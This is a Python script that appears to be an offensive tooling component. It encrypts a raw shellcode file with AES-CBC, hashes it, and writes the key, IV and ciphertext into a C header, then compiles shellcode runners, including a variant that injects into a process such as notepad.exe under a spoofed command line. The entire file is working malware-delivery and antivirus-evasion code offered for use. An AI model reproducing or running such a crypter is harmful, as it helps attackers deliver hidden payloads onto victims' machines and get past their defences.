import sys, os, argparse
from base64 import encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
from ctypes import *


TEMPLATE = """
#define X64PROC "%s"
#define CMDLINE "%s"
#define PAYLOAD_HASH %s
#define ENCRYPTED_BIN_LEN %s
#define OG_PAYLOAD_LEN %s


uint8_t iv[]  = { %s };
uint8_t key[] = { %s };

unsigned char encrypted_instructions[ENCRYPTED_BIN_LEN] = { %s };
"""


def format_shellcode(shellcode):
    hshellcode = ""
    code_size = len(shellcode)
    for num, byte in enumerate(shellcode):
        if num != code_size - 1:
            hshellcode += f"{hex(byte)},"
        else:
            hshellcode += f"{hex(byte)}"
    return hshellcode


# arguments
verbose = False
parser = argparse.ArgumentParser(description="generate AES encrypted shellcode runners")
parser.add_argument('-inbin', type=str, help=".bin file")
parser.add_argument('-execmethod', type=str, choices=['section_inject', 'section_runner', 'section_runner_dll', 'runner', 'runner_dll'], default="runner")
parser.add_argument('--process', type=str, help="process to inject (only with \'section_inject\')", default="notepad.exe", required=False)
parser.add_argument('--cmdline', type=str, default="notepad", help="cmdline argument to show", required=False)
parser.add_argument('--verbose', default=False, action='store_true', dest='verbose')
args = parser.parse_args()
input_filename = args.inbin
exec_method = args.execmethod


# get hash value of payload with sfh.c
sfh_so = "./sfh.so"
sfh = CDLL(sfh_so)
SuperFastHash = sfh.SuperFastHash
SuperFastHash.argtypes = [c_char_p, c_uint32]
SuperFastHash.restype = c_uint32
with open(input_filename, "rb") as file: data = file.read()
data_len = c_uint32(len(data))
res = SuperFastHash(data, data_len)

# encrypt payload
key = get_random_bytes(16)
iv = get_random_bytes(16)
cipher = AES.new(key=key, mode=AES.MODE_CBC, iv=iv, )
encrypted_data = cipher.encrypt(pad(data, AES.block_size))

payload_hash = res
e_len = len(encrypted_data)
og_len = data_len.value
hex_iv = format_shellcode(iv)
hex_k = format_shellcode(key)
e_shc = format_shellcode(encrypted_data)

# create variables for config.h
if exec_method == "section_inject":
    proc = args.process
    proc_cmdline = args.cmdline
    config_h = TEMPLATE % (proc, proc_cmdline, payload_hash, e_len, og_len, hex_iv, hex_k, e_shc)
else:
    proc = ""
    proc_cmdline = ""
    config_h = TEMPLATE % (proc, proc_cmdline, payload_hash, e_len, og_len, hex_iv, hex_k, e_shc)

with open("new_config.h", "w") as f:
   f.write(config_h)

# make the binary
if args.verbose:
    print("[*] Printing new_config.h\n\n")
    print(config_h)
    print("[+] compiling . . .")
    os.system(f"make {exec_method}")
else:
    os.system(f"make {exec_method} 1>/dev/null 2>&1")
